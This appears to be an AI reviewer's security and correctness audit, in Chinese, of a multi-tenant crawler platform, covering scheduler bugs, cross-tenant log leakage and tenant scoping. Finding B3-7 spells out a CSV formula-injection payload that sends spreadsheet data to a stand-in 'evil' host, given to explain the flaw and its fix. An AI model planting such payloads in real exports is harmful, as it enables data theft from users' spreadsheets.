<!-- manager 落盘：2026-09-28，reviewer（G-fresh）最终交付原文逐字提取自其交付记录（交付后该 agent 因 API 限流终止，不影响已交付内容）；packet 见 ../packets/ -->

# Findings — B3-spider-flows（爬虫定义 / 模板 / 调度 / 任务 / 结果 / 导出 / 节点 / 日志 / AI 智能采集）

## Snapshot
- HEAD：82259f301c060dbf411424ec8775f29944e313e1（工作区只新增了 docs/ops/）
- explore_roots `git ls-files -s` 的 sha256 为 4382ef195d7f35f12ab3a93748cb1948c07fa2660525ff3310ddc791f2c002d6，由 manager 计算，这里原样照抄。
- reviewer：sdlc-workflow:reviewer（G-fresh，只读）。packet：`/Users/xuyun/auto_agents/.sdlc/_review/2026-09-27-project-audit-r2/B3-spider-flows/packets/2026-09-27-2310-review-reviewer-B3-spider-flows.md`
- 做了什么：读完全部必需输入和 5 张截图；按需读了 `spider_query_service.py`、`spider_registry_service.py`、`spider_task_service.py:105-305`、`ai_planner/orchestrator.py`、`ai_planner/state.py`（grep）、`spider_common.py`、`spider_definition_repository.py`、`spider_schedule_repository.py`、`platform_core/repository.py`、`platform_core/tenant_context.py`、`consumer.py:250-329`、`test_spider_task_flow.py:600-750`、前端 `ai.ts` 和 `useAiPlanFlow.ts`。
- **我没有执行任何命令，也没有复现任何问题。** 结论分三类：静态推断、截图可见、manager 已记录的执行。需要复现的条目，在文末写了精确命令。
- 第一轮 R2 QA-1~20 和 R4 QA-1~21 没有重复报告。与它们相关的条目会注明「补充证据」。

**结论**：共 14 条。blocker 1 条（有条件，见 B3-1），major 7 条，minor 6 条。
- 最高风险：定时调度一旦成功入队，ORM 对象就会过期，调度时刻推进不了（B3-1，静态推断，需要复现）。
- 截图直接证实的问题：任务日志其实是所有任务、所有租户共用一个文件的尾部（B3-2）；Worker 重启 69256 次，页面仍显示「在线」（B3-3）。
- 业务上的两处断点：AI 试采通过后计划被卡死（B3-5）；AI「上线」产出的采集方案是空壳，没有参数（B3-6）。

---

## FINDINGS

### B3-1 定时调度成功入队后会话过期，调度时刻不推进，每 30 秒重复入队
- Dimension：5 / 6 / 8 / 3 | Severity：**blocker**（路径是确定性的，属静态推断；复现不成立则降为 minor） | 工作量：S
- **现象**：计划到期、入队成功后，`last_run_at` 和 `next_run_at` 都不更新。下一轮 tick 又判定到期，再次入队。
- **触发条件**：任何一条启用的计划，入队路径走到 `commit`（也就是正常成功入队）。
- **根因**：
  - 调度器自己建了一个会话：`AsyncSession(self._engine())`（`backend/services/schedule_service.py:240`）。它用默认的 `expire_on_commit=True`，全仓 `platform_core` 里找不到 `expire_on_commit` 配置。
  - `list_due` 读出的 `schedule` ORM 对象就在这个会话里（`:246`）。`_fire` 又把同一个会话交给 `SpiderService(session).enqueue`（`:298-302`）。
  - 入队在 `spider_task_service.py:276` 执行 `await self.session.commit()`，于是 `schedule` 的所有属性都过期。
  - 回到 `_fire` 后，`:305` 读 `schedule.id`，触发隐式懒加载，异步会话会抛 `MissingGreenlet`。异常被 `:313` 捕获，但 `:315` 的日志 f-string 又一次读 `schedule.id`，在 except 里再次抛出，于是逃出 `_fire`。
  - `_advance_schedule`（`:317`、`:378-385`）根本没有执行。整轮被 `_tick_loop` 的 `:212-213` 吞掉，只记一行「调度轮次执行失败」。同一轮后面到期的计划也全部跳过。
- **测试是空的**：`backend/tests/test_spider_task_flow.py:622-749` 的调度测试，会话、仓储、计划对象全是 `MagicMock`。它们只能证明逻辑上会推进，证明不了真实会话下能推进。
- **后果**：
  - 下一轮 tick 仍然判定到期，再入队一次。R2 QA-2 已指出租户并发槽在首次分发时从不写入，所以 `scard` 恒为 0，拦不住。
  - 只有 `QuotaService.check_task_concurrency` 能兜底，于是每 30 秒多一条重复任务，直到租户配额满为止。
  - 重复任务又会叠加 R2 QA-1 的唯一键毒消息问题。
  - 计划列表上「上次运行」永远为空，「下次运行」一直停在过去的时间。
- **修复方案**：
  - 方案一：进入 `_fire` 时先把 `schedule_id`、`cron_expr`、`params`、`tenant_id`、`spider_name` 取成局部标量，之后只用标量。
  - 方案二：调度器改用 `AsyncSession(engine, expire_on_commit=False)`。
  - 另外，入队建议为每条计划开独立会话，一条出错不连坐同轮其他计划。任何非业务异常后先 `rollback()` 再推进时刻。
- **应补测试**：用真实 `AsyncSession`（aiosqlite，或 dev MySQL 事务内回滚），把 `SpiderService` 桩成只执行 `await session.commit()` 的对象，调 `_fire`，然后断言 `last_run_at` 不为空，且不抛异常。再加一条：连续两次 `_tick_once` 只入队一次。
- **核验方式**：静态推断，依据是 SQLAlchemy 异步会话的隐式 IO 语义。复现步骤见文末 V-1。

### B3-2 任务日志 = 共享 spider.log 从「分发偏移」读到文件尾：串任务、跨租户可见、每次轮询读全文件
- Dimension：4 / 5 / 1 / 9 | Severity：**major** | 工作量：M
- **现象（截图可见）**：`admin_spiders_logs-1440.png` 选中的是「#3 example（已完成）」。这个任务创建于 2026-09-14（见 tasks 截图），但日志区显示的是 `2026-09-27 22:57:15` 的 Scrapy 启动横幅和 DeprecationWarning，与任务 #3 无关。
- **触发条件**：同一 worker 在任务之后还有任何输出（其他任务、其他租户、空闲重生）；或者偏移键过期；或者日志轮转。
- **根因**：
  - 所有爬虫、任务、租户共用一个文件 `logs/spider/spider.log`（`backend/services/spider_common.py:79-93`，`:82`）。
  - 分发时只记录起始偏移（`backend/tasks/consumer.py:320-327`），键带 `ex=ACTIVE_TASK_TTL`，没有结束偏移。
  - `_read_task_log_sync` 执行 `f.seek(offset)` 然后 `f.read().splitlines()`，一直读到文件尾（`spider_common.py:148-152`）。
  - 偏移键过期后 `offset=None`，从 0 读整个文件。文件轮转后 `offset > size`，条件 `0 < offset <= size` 不成立，也从 0 读。
  - 端点只要求 `require_login`（`backend/app/api/v1/spiders/tasks.py:131-141`）。任务归属虽经租户作用域校验（`spider_query_service.py:315`），但返回的内容与归属无关。
- **后果**：
  - 安全（维度 4）：租户 B 的只读账号查看自己的任务日志，会看到平台上其他租户任务的 URL、参数、报错栈。这是跨租户信息泄露。
  - 正确性：已完成任务的日志不断被后来的内容覆盖，无法用来排障。
  - 性能：
    - `SpiderLogs.tsx:40-45` 对未终态任务每 2 秒轮询一次。
    - `useAiPlanFlow.ts:104-113` 把 `fetchTaskLogs(id, 5)` 当成任务状态探针，每 3 秒一次。
    - 每次请求都把偏移之后（最坏是整个文件）读进内存再 `splitlines`。
    - 配合 B3-3 的高频重生横幅，文件增长很快。
- **修复方案**：
  - 按任务写独立日志文件（`logs/spider/tasks/{task_id}.log`，由 scrapy 侧按 `task_id` 分流 handler）。
  - 如果短期内保留单文件：终态时写入 `end_offset`，读取限定在 `[start, end)`。偏移持久化到任务行，不要依赖 TTL 键。偏移缺失时返回空加提示，不要读全文件。按块从尾部反向读（seek + 固定 buffer）。
  - AI 流程改用 `GET /spiders/tasks?…` 或专门的任务状态端点查状态，不要借用日志接口。
  - 租户用户能否看原始日志，见 Q-B3-3。
- **应补测试**：两个任务先后分发并写日志，断言任务 1 只返回自己区间的行。偏移键缺失时断言返回空。租户 B 查自己的任务，返回内容不含租户 A 的标记行。
- **核验方式**：截图 + 静态。复现见 V-2。

### B3-3 节点页 `online=True` 写死：Worker 10 天重启 69256 次仍显示「在线」；活跃任务按爬虫汇总，不按节点
- Dimension：9 / 8 / 3 | Severity：**major**（重启若为崩溃循环）/ minor（若是设计内的空闲回收） | 工作量：M
- **现象（截图可见）**：`admin_spiders_nodes-1440.png` 中，节点 ffe413c56357「启动于 2026-09-17T15:33:47 · 重启 69256 次」，状态绿点「在线」，当前任务「空闲」。10 天约 86.4 万秒，折合约每 12.5 秒重启一次。
- **根因**：
  - `spider_registry_service.py:432` 对所有扫到心跳键的节点一律 `online=True`。
  - `respawn_count` 只做展示（`:431`），没有速率阈值，也没有健康分级。
  - 每个节点的 `active_tasks` 取自按爬虫的全局集合 `ACTIVE_TASK_KEY.format(spider_name=…)`（`:389-396`），与 worker 无关。多 worker 承载同一爬虫时，每个节点显示的都是同一批任务。
  - 该集合还会泄漏（R2 QA-5），所以节点页会显示僵尸任务。
- **后果**：运维无法区分「健康」和「崩溃循环」。高频重生每次都向共享 `spider.log` 写约百行启动横幅（B3-2 截图可见），反过来放大了日志读取成本。我的推测是空闲收尾 30 秒（R4 QA-1）加 7 个爬虫轮流重生，**未核实**。
- **修复方案**：
  - 节点健康改为三态：在线 / 抖动 / 离线。按心跳年龄加近 N 分钟重生速率判定，例如 `respawn_rate > 阈值` 标为「抖动」并告警。
  - 心跳 hash 中写入 `last_respawn_at` 和 `respawn_count_window`。
  - 活跃任务由 worker 在心跳里上报自己持有的 task_id，替代按爬虫的全局集合。
  - 如果重生是空闲回收的设计行为，就把它和崩溃重启分开计数，并在 UI 上区分。
- **应补测试**：心跳 hash 带高重生速率时，`list_nodes` 返回「抖动」。两个 worker 承载同一爬虫时，各自只显示自己的任务。
- **核验方式**：截图 + 静态。原因核实见 V-3。

### B3-4 注册表按名查询不带租户条件：平台态和后台态会取错租户或抛 `MultipleResultsFound`；删除引用检查跨租户
- Dimension：4 / 6 / 8 | Severity：**major** | 工作量：M
- 这是 R2 QA-11「后台路径绕过租户作用域」的具体落点，属补充新证据。
- **根因**：
  - 唯一键是 `(tenant_id, name, alive_flag)`，同名跨租户是合法的（`platform_core/models/spider_definition.py:26-29`）。
  - `SpiderDefinitionRepository.get_by_name` 只按 name 查，结果用 `scalar_one_or_none()`（`backend/repositories/spider_definition_repository.py:28-32`），不过滤 tenant，也不过滤 `deleted_at`。
  - 自动注入只在 tenant 态生效（`platform_core/tenant_context.py:138-140`）。平台超管请求是平台态，调度器后台和 AI 后台任务是平台态或无上下文，这两种情况都不过滤。
- **后果**：
  - (a) 定时计划、平台超管入队时，`_definition_default_params`（`spider_task_service.py:213-217`）吞掉 `MultipleResultsFound`，返回 None。结果：采集方案的定义参数被静默丢弃，消费者报「params 缺少 urls」失败（`consumer.py:263-265`）。
  - (b) `_ensure_spider_available`（`:188-193`）同样吞掉异常并跳过校验，已停用的方案仍可由调度器入队。
  - (c) 全库只有一行同名定义、且属于另一租户时，租户 B 的计划（名字需通过 B 作用域的校验，例如 yml 种子名）会拿到租户 A 的 params（URL，以及可能带凭据的 headers）和 A 的 enabled 状态。这是跨租户数据误用，属条件性问题。
  - (d) `delete_if_unreferenced` 对 DELETE 语句的注入只给外层表加 tenant 条件（`tenant_context.py:143-150`）。`NOT EXISTS (SELECT spider_tasks …)` 子查询不带租户条件（`spider_definition_repository.py:41-44`）。结果：租户 B 删除自己的「news」方案时，会被租户 A 的同名任务挡住。随后 `count_by_spider` 是按作用域计数的，返回 0，于是报出自相矛盾的「存在 0 条历史任务记录，拒绝删除」（`spider_registry_service.py:347-353`），同时也泄露了其他租户在用这个名字。平台态下删除，会一并删掉所有租户的同名定义。
- **修复方案**：
  - `get_by_name(name, tenant_id)` 显式传租户，调用方从任务行或计划行取得 tenant。后台路径改用 `background_session(anchor)`（R2 QA-11）。
  - `delete_if_unreferenced` 的子查询加上 `SpiderTask.tenant_id == SpiderDefinition.tenant_id`。
  - 读取统一用 `scalars().first()` 加租户条件，不要让 `scalar_one_or_none` 在多租户下抛异常。
  - 注册表校验的异常处理改为 fail-closed（与 R2 QA-19 合并）。
- **应补测试**：两个租户各建同名定义，平台态调用 `enqueue` 和调度 `_fire`，断言使用的是计划所属租户的 params。租户 A 有同名任务时，租户 B 能删除自己的定义。
- **核验方式**：静态。数据核实见 V-4。

### B3-5 AI 试采通过后状态仍是 `testing`，而 `testing` 属于忙碌态：无法重规划、重试采或删除；重启后被改成 failed
- Dimension：6 / 8 / 9 | Severity：**major** | 工作量：S–M
- **现象**：计划试采通过后，只能走「注册」这一条路。点「试采」会被后端拒绝，提示「试采进行中，请勿重复触发」，与事实不符。点「删除」提示「正在规划/试采中」。状态筛选「试采中」里混着已通过的计划。
- **根因**：
  - 通过后保持 `testing`（`backend/services/ai_planner/orchestrator.py:291-294`），而 `_BUSY_STATUSES = ("planning","testing","registered")`（`state.py:30`）。
  - 因此 `launch_plan` 在 `:155-156` 拒绝，`launch_test` 在 `:179-180` 拒绝，`delete_plan` 在 `:107-108` 拒绝。
  - 前端 `PlanDetail.tsx:299` 在 `testing` 状态下仍然启用试采按钮，靠 `isPlanPolling` 的特判（`ai.ts:99-107`）才停止轮询。前后端对状态的理解不一致。
  - 启动对账无条件把 `testing` 改成 `failed`，并写入「进程中断，请重新发起」（`state.py:105-117`），把「已通过待注册」也一起抹掉了。
- **后果**：「试采→调整→再试采」这个核心迭代路径被卡住。每次重启，已通过的计划都显示失败，误导用户重新走一遍，多消耗 LLM token。
- **修复方案**：新增显式状态 `tested`（或 `ready`），表示试采通过、可注册。`tested` 不属于忙碌态，允许重规划、重试采、删除，也允许注册。对账只处理真正在跑的 `testing`，并以 `test_task_id` 对应的任务仍未终态为条件。前端按钮可用性以后端状态为唯一依据。
- **应补测试**：通过后 `status=='tested'`。`tested` 状态下 `launch_test`、`delete_plan` 成功。对账不改动 `tested`。
- **核验方式**：静态。数据核实见 V-5。

### B3-6 AI「上线」注册出来的方案没有参数；按方案名运行会失败或卡在无人消费的队列
- Dimension：1 / 6 / 9 | Severity：**major**（需复现） | 工作量：S–M
- **现象**：AI 页显示「已上线为采集方案：ai_xxx」，但从方案列表或调度运行它时，要么失败，要么一直卡在 running。
- **根因**：
  - `register` 只用 name、title、type、description 构造 `DefinitionCreateRequest`（`orchestrator.py:386-395`）。这个 schema 本身就没有 params 字段（`platform_core/schemas/spider.py:247-252`），所以注册后 `spider_definitions.params` 为 NULL。
  - 只有之后有人编辑元信息时，`_flow_definition_params` 才会写入镜像参数（`spider_registry_service.py:295-329`）。
  - 入队时（`spider_task_service.py:238-243`）：
    - 不带 params：定义参数为 None，消费者报「params 缺少 urls」失败（`consumer.py:263-265`）。
    - 用户只填 urls 和 selectors：`extract_flow` 要求至少有 pagination、detail、filters 之一（`spider_common.py:124-137`），否则返回 None，`spider_name` 仍是 `ai_xxx`，任务被投到 `ai_xxx:start_urls`。节点截图显示 worker 只承载 7 个代码爬虫，没有人消费这个队列。
  - 试采之所以能通过，是因为它显式传了 `spider_name="flow_generic"`（`orchestrator.py:265-267`），掩盖了这个问题。
- **后果**：AI 智能采集的价值闭环「规划→试采→上线→按方案运行/定时」在最后一步断开，用户看到的「已上线」不是真的。
- **修复方案**：
  - 注册时把 `generated_params` 写入定义的 params（给 `create_definition` 增加 params 参数，或注册后立即 update）。
  - 路由规则改为「定义 `type=='flow'` 即走 `FLOW_SPIDER_NAME`」，不再依赖可选段是否存在。`extract_flow` 把 `selectors` 也视为流程标记。
  - 注册前做一次按方案名入队的冒烟检查。
- **应补测试**：注册后 `definition.params == plan.generated_params`。只含 urls 和 selectors 的 flow 方案入队后，任务的 `spider_name=='flow_generic'`。
- **核验方式**：静态。复现见 V-6。

### B3-7 CSV 导出不防公式注入（明确面向 Excel 打开）
- Dimension：4 | Severity：**major** | 工作量：S
- **现象和触发条件**：采集到的网页标题或内容以 `=`、`+`、`-`、`@`、制表符或回车开头，例如 `=HYPERLINK("http://evil/?"&A1,"点我")`。用户导出 CSV 后用 Excel 打开，公式会被执行。
- **根因**：`_iter_export_chunks` 原样写入 `_export_row`（`backend/services/spider_query_service.py:211-228`），而且特意加了 BOM「Excel 兼容」（`:216`）。数据来源是不可信的第三方网页。
- **后果**：通过导出文件实现数据外带或钓鱼，受害者是租户自己的运营人员。
- **修复方案**：对 str 值，首字符属于 `= + - @ \t \r` 时加前缀 `'`（OWASP 建议）。JSON 导出不受影响。
- **应补测试**：导出 title 为 `=1+1` 的行，断言 CSV 单元格以 `'=` 开头。
- **核验方式**：静态。

### B3-8 调度时区没有定义：cron 按进程本地时区执行，容器未设 TZ，与平台「上海业务日」口径不一致
- Dimension：6 / 8 / 9 | Severity：**major**（前提是生产容器为 UTC；根目录 Dockerfile 和 compose 用 Grep 找不到 TZ） | 工作量：S
- **根因**：
  - 模块约定「基于本地时间」（`schedule_service.py:11-13`）。`next_fire_time` 用 `datetime.now()`（`:54-56`），tick 用 `now = datetime.now()`（`:239`），静默时段也按本地时区判定（`:348-372`）。
  - 模型声明 `DateTime(timezone=True)`（`spider_schedule.py:25-26`），但 MySQL DATETIME 不存时区。
  - 统计口径是上海（`spider_query_service.py:379`）。
  - 在 `Dockerfile` 和 `docker-compose.yml` 上 Grep 到的 TZ 只出现在 `deploy/litellm` 和 `deploy/newapi`。
- **后果**：租户配置「0 9 * * *」，实际在北京时间 17:00 执行。静默时段错位 8 小时。前端直接显示不带时区的 `next_run_at`（tasks 截图中的创建时间同样是裸 ISO 字符串）。停机期间错过的触发只补一次、之后按当前时间重算（`:375-382`），这个语义也没有文档说明。
- **修复方案**：新增配置 `SCHEDULER.TIMEZONE`（默认 Asia/Shanghai），`croniter` 使用带时区的 base，DB 统一存 UTC，API 输出带偏移的 ISO。如果需要，给计划加 `timezone` 字段。补偿策略写入文档，选项有 fire-once 或 skip，做成可配置。取舍见 Q-B3-2。
- **应补测试**：TZ=UTC 环境下，cron「0 9 * * *」算出的下次触发是 01:00Z。
- **核验方式**：静态 + Grep。核实见 V-7。

### B3-9 采集方案权限倒挂，删除时不检查调度和模板引用
- Dimension：4 / 6 / 8 | Severity：minor | 工作量：S
- **根因**：
  - 启停需要 `require_admin`（`definitions.py:61`），删除却只需 `require_operator`（`:109`）：经办人能做更强的删除，却做不了更弱的停用。
  - 前端注释写的是「仅管理员」（`frontend/admin/src/services/spiders.ts:309, 318`），与后端不一致。
  - 删除只检查 spider_tasks 引用（`spider_definition_repository.py:41-44`），不检查 `spider_schedules` 和 `task_templates`。
- **后果**：方案被删后，孤儿计划在每次 cron 到点时都被「未在注册表登记」拒绝，然后推进时刻，不断写 warning，但用户看不到。孤儿模板运行时才报错。
- **修复方案**：启停与删除使用同一级权限，或者删除更严格。删除前检查计划和模板引用，一并提示，或者级联停用。前端注释与后端对齐。
- **核验方式**：静态。

### B3-10 调度计划「同爬虫唯一」只在应用层校验，且在平台态下跨租户生效；启用时不复检注册表
- Dimension：6 / 8 | Severity：minor | 工作量：S
- **根因**：
  - `find_by_spider` 不带租户条件（`spider_schedule_repository.py:41-45`）。平台超管创建计划时是平台态，只要任一租户已有同名计划就被拒绝（`schedule_service.py:102-104`）。
  - DB 没有唯一约束，并发创建会产生重复计划。
  - `update_schedule` 启用时不复检爬虫是否仍登记、是否启用（`:131-144`）。
  - 模型挂了 `SoftDeleteMixin`（`spider_schedule.py:17`），实际却是硬删除（`:157`）。
- **修复方案**：按 `(tenant_id, spider_name)` 建唯一约束（注意 alive_flag 模式），查询显式带租户，启用时复用 `_ensure_spider_available`。
- **核验方式**：静态。

### B3-11 删除单条结果时重算的 `result_count` 包含候选行；返回形状与前端类型不一致
- Dimension：6 | Severity：minor | 工作量：S
- **根因**：
  - 列表计数排除了候选行（`spider_query_service.py:85-87`），删除后重算却没排除（`:278`）。
  - 重算失败被 `except: pass` 静默吞掉（`:281-282`）。
  - 返回 `{"id":…, "deleted":True}`（`:284`），前端类型是 `{result_id, deleted}`（`spiders.ts:282-287`）。
- **后果**：删除一条后，任务的「采集结果」数跳到比列表多的值。
- **修复方案**：重算时统一传 `exclude_source=CANDIDATE_SOURCE`。失败时记 warning。统一返回键名。
- **核验方式**：静态。

### B3-12 AI 试采超时后，已入队的试采任务不会被终止
- Dimension：8 / 5 | Severity：minor | 工作量：S
- **根因**：`_wait_task_final` 超时抛出业务异常（`orchestrator.py:346-349`），`_fail` 只把计划置为 failed（`:422-429`），不对 `test_task_id` 下发 stop。
- **后果**：孤儿低优先级任务继续占用租户并发配额、消耗目标站资源。用户重新发起试采时，可能直接因配额被拒。
- **修复方案**：超时或失败时对试采任务调用 `control_task(stop)`，或把它标为 cancelled。
- **核验方式**：静态。

### B3-13 Scrapy 中间件使用已弃用的 `process_request(spider)` 签名（运行日志可见）
- Dimension：1 / 7 | Severity：minor | 工作量：S
- R4 没有涉及这一点。
- **现象（截图可见）**：`admin_spiders_logs-1440.png` 中有 `ScrapyDeprecationWarning: AccountSessionMiddleware.process_request() requires a spider argument, this is deprecated…`，FingerprintMiddleware 和 ProxyMiddleware 也有同样的警告。
- **后果**：升级 Scrapy 后这些中间件会直接失效。每次重生还会往共享日志里写 3 条以上多行警告，加重 B3-2。
- **修复方案**：改用 `from_crawler` 保存 crawler 或 spider 引用，把签名改为新形式。在 CI 中对 scrapy 开启 `-W error::scrapy.exceptions.ScrapyDeprecationWarning` 冒烟检查。
- **核验方式**：截图。

### B3-14 界面一致性：AI 页有两套步骤条；任务「类型」列显示「-」；时间是裸 ISO
- Dimension：9 | Severity：minor | 工作量：S
- **现象（截图可见）**：
  - `admin_ai-1440.png` 同时出现「输入目标 / 方案与试采 / 上线」和「创建计划 / 方案预览与调整 / 试采与上线」两套步骤条，编号和含义不一致。
  - `admin_spiders_tasks-1440.png` 中任务 #3 的类型为「-」，创建时间显示为 `2026-09-14T09:02:53`。
  - 截图同时暴露了一处产品覆盖面缺口：dev 库只有 1 个任务、1 条结果，调度、模板、AI 计划都没有运行态截图（见维度 9）。
- **根因（推断）**：注册表读面过滤了内部爬虫（`spider_common.py:73` 把 example 列为内部项），任务表按注册表查类型时查不到。
- **修复方案**：保留一套步骤条。类型查找回退到 DB 定义。时间统一格式化，并显示时区。
- **核验方式**：截图。

---

## Dimensions checked
1. **标准符合 ⚠️**：没有 spec 输入，按 docstring 和 GWT 引用判断。发现 AI「上线」不成立（B3-6）、日志「按任务隔离」不成立（B3-2）、「同租户唯一」写成了「同爬虫全局」（B3-10）。packet 提到的「取消/重试/批量」没有独立端点：重跑靠再次提交，取消走 control，这部分 ➖。
2. **标准质量 ⚠️**：AI 状态机缺少「已通过」态（B3-5）；调度补偿语义没有定义（B3-8）。
3. **证据有效 ⚠️**：调度测试全部基于 MagicMock，对会话语义来说是空断言（B3-1）；节点「在线」是写死的（B3-3）。本人没有执行任何命令。
4. **安全 ⚠️**：跨租户日志泄露（B3-2）；注册表跨租户取值和删除（B3-4）；CSV 公式注入（B3-7）；权限倒挂（B3-9）。可取的地方：模板运行校验了归属（`spider_registry_service.py:502-508`）；日志路径有穿越防护（`spider_common.py:89-92`）；导出格式在 API 层做了白名单（`results.py:91`）。
5. **性能 ⚠️**：每 2–3 秒整读一次日志文件（B3-2）；节点页已消除 N+1（`spider_registry_service.py:399-403`，✅）；导出上限 100 条，内存有界。
6. **契约一致 ⚠️**：B3-4、5、6、9、10、11。
7. **合规（宪法）⚠️**：R10 入口日志：`list_templates` 只打 debug（`spider_registry_service.py:444`），`delete_result` 有日志。「日志即证据」在 B3-2 下实际失效，因为日志不可追溯到具体任务。依赖方向和 B1–B3 在所读文件中没有发现违例。
8. **边界 ⚠️**：同名跨租户（B3-4）、重复触发（B3-1）、并发创建计划（B3-10）、超时孤儿（B3-12）、日志轮转和偏移过期（B3-2）。
9. **产品价值 ⚠️**：截图只覆盖平台超管视角，缺租户负责人视角；dev 数据只有 1 个任务，所以调度、模板、AI 全流程没有运行态证据，这部分 ➖。可以确认的是：日志页展示的是无关内容；节点页把高频重启显示为健康；AI「上线」是空壳。它们分别直接损害「可排障」「可运维」「AI 一键上线」三个卖点。

## Strengths（改进时应保留）
1. AI 触发用 `claim_status` 条件 UPDATE 原子抢占，防止双跑（`orchestrator.py:160-194`）；`_fail` 先 rollback 再置 failed（`:422-429`）；启动时对账中断的计划（`state.py:105-117`）。
2. 删除定义用单条 `DELETE … NOT EXISTS` 防 TOCTOU（`spider_definition_repository.py:34-46`）。补上租户条件后可以直接沿用。
3. 调度锁的设计正确：TTL ≥ 2×tick、自动续期、检测 `lost` 后提前退出（`schedule_service.py:216-254`）。
4. 导出：空结果不产生文件；租户 miss 与不存在返回同样的形状；列表、导出、出站拉数共用「非候选」谓词（`spider_query_service.py:59-60, 160-194`）。
5. 节点页批量查询消除了 N+1；日志读取放进 `to_thread`，并有路径白名单（`spider_registry_service.py:399-403`，`spider_query_service.py:325-327`，`spider_common.py:89-92`）。

## Improvement themes
| # | 主题 | 目标状态 | 覆盖 | 顺序 |
|---|---|---|---|---|
| T1 | 调度正确性 | 触发路径只用标量或 `expire_on_commit=False`；每条计划独立会话；调度时区可配置、存 UTC；`(tenant, spider)` 唯一约束；用真实 DB 做集成测试 | B3-1、8、10 | 第一步：B3-1 为 S 级，先修，并补真实会话测试 |
| T2 | 注册表的租户一致性 | 按名查询显式带 tenant；后台路径走 `background_session`；DML 子查询带租户；删除检查计划和模板引用；权限一致 | B3-4、9（并入 R2 QA-11、19） | 第二步 |
| T3 | AI 采集闭环 | 新增 `tested` 态；注册时写入 params；按定义类型路由到 `flow_generic`；超时终止试采任务 | B3-5、6、12 | 第三步，与 T2 并行 |
| T4 | 日志与节点可观测 | 按任务日志文件（或 start/end 偏移入库）；租户隔离；尾部分块读取；节点三态健康与按节点上报任务；清理弃用签名 | B3-2、3、13 | 第四步：B3-2 的安全部分可先加「无偏移返回空」止血（S） |
| T5 | 数据出口可信 | CSV 防注入；计数口径统一；导出上限按产品决定 | B3-7、11、Q-B3-1 | B3-7 为 S 级，可随 T1 一起发布 |

## 需要 manager 执行的验证（reviewer 未执行）
- **V-1（B3-1）**
  - 单测：用 aiosqlite 或 dev 引擎建真实 `AsyncSession`，`import platform_core.models` 后 `create_all`。插入 `SpiderSchedule(spider_name="example", cron_expr="* * * * *", tenant_id=1, next_run_at=过去时间)`。然后：
    ```
    patch("backend.services.schedule_service.SpiderService", lambda s: type("S",(object,),{"enqueue": lambda self, **k: s.commit()})())
    ```
    再调 `SpiderScheduler()._fire(session, SpiderScheduleRepository(session), schedule, datetime.now())`。预期抛出 `MissingGreenlet`，且 `last_run_at` 仍为 NULL。
  - 或者在运行中的系统上查：`grep -n "greenlet_spawn\|调度轮次执行失败" logs/*.log | tail`，以及 `SELECT id, spider_name, last_run_at, next_run_at FROM spider_schedules;`
- **V-2（B3-2）**：
  - `grep -n TASK_LOG_OFFSET_KEY platform_core/queues.py`，拿到键名后执行 `redis-cli GET <键>` 看任务 3 的偏移；
  - `ls -lh logs/spider/`；
  - `curl -s -H "Authorization: Bearer $T" 'http://127.0.0.1:9111/api/v1/spiders/tasks/3/logs?lines=5'`，预期返回 2026-09-27 的无关行。
- **V-3（B3-3）**：`redis-cli --scan --pattern '<WORKER_HEARTBEAT_PREFIX>*'` 后对结果做 `HGETALL`；`grep -rn "respawn" scripts/runlib/ | head`；`grep -c "Scrapy .* started" logs/spider/spider.log`。
- **V-4（B3-4）**：`SELECT name, COUNT(*) c FROM spider_definitions WHERE deleted_at IS NULL GROUP BY name HAVING c>1;` 和 `SELECT tenant_id, name, type, source, params IS NULL FROM spider_definitions;`
- **V-5（B3-5）**：`SELECT id, status, JSON_EXTRACT(plan_json,'$.test_history[last].passed') p, error_message FROM ai_plans;`
- **V-6（B3-6）**：`SELECT name, type, source, params FROM spider_definitions WHERE source='ai_generated';`，预期 params 为 NULL。需要的话，在测试租户下按该方案名 `POST /spiders/run`（不带 params），观察任务终态和 error_message。
- **V-7（B3-8）**：`grep -n "TZ" Dockerfile docker-compose.yml`；在容器内执行 `date`；MySQL 执行 `SELECT @@global.time_zone, @@session.time_zone;`

## Decisions
- 审查员不做决策。唯一的操作性默认：严重度按影响 × 可能性评定；依赖未核实事实的条目，已写明升级或降级的条件。

## Open questions（战略，待确认）
- **Q-B3-1 导出上限（产品和计费边界）**：现在单任务只能导出按 id 排序的前 100 条，没有 offset 或筛选，第 101 条以后在 UI 上无法导出。
  - 选项：(a) 维持 100 条，引导用户用出站拉数 API；(b) 按套餐分级设上限并支持分页或时间段导出；(c) 改为异步大文件导出（后台生成、下载链接、有效期）。
  - 推荐：(b)，并把上限写进套餐页。
- **Q-B3-2 调度时区语义**：
  - 选项：(a) 全平台固定 Asia/Shanghai；(b) 每条计划自带时区，默认取租户设置。
  - 推荐：(a) 先落地，同时把存储改为 UTC，为 (b) 留出字段。
- **Q-B3-3 租户能否查看原始采集日志**：
  - 选项：(a) 租户只看本任务的结构化事件（开始、页数、错误摘要），原始日志只对平台开放；(b) 租户看本任务原始日志（前提是按任务隔离）。
  - 推荐：(a)，这样可以避免暴露内部栈和中间件信息。

## Product-delta
- 无（docs/product 产品层尚未建立）。

## Lessons
- 没有经过执行验证的陷阱可以沉淀。候选：「异步会话默认 expire_on_commit=True，同一会话里 commit 之后读 ORM 属性会抛 MissingGreenlet；全 Mock 的测试发现不了」。V-1 复现后可以沉淀。

## Output paths
- 本报告由 manager 保存到 `/Users/xuyun/auto_agents/.sdlc/_review/2026-09-27-project-audit-r2/B3-spider-flows/05-review/findings.md`，reviewer 没有写任何文件。
